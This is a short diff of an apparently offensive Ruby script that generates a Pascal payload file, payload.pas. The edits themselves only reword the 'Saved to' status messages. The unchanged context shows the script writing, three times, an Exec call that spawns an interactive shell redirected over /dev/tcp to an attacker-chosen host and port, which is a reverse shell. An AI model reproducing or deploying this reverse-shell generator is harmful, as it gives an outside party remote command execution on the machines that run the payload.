@@ -79,7 +79,7 @@ if File.directory? file
 		f.puts "    Exec(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1\");"
         	f.puts "end."
             }
-            puts "#{i}Saved to #{file}."
+            puts "#{s}Saved to #{file}!"
         else
             file = "#{file}/payload.pas"
             sleep(0.5)
@@ -92,7 +92,7 @@ if File.directory? file
 		f.puts "    Exec(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1\");"
         	f.puts "end."
             }
-            puts "#{i}Saved to #{file}."
+            puts "#{s}Saved to #{file}!"
         end
     else
         puts "#{e}Output directory: #{file}: does not exist!"
@@ -117,7 +117,7 @@ else
 		f.puts "    Exec(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1\");"
         	f.puts "end."
             }
-            puts "#{i}Saved to #{file}."
+            puts "#{s}Saved to #{file}!"
         else
             puts "#{e}Error: #{direct}: not a directory!"
             abort()
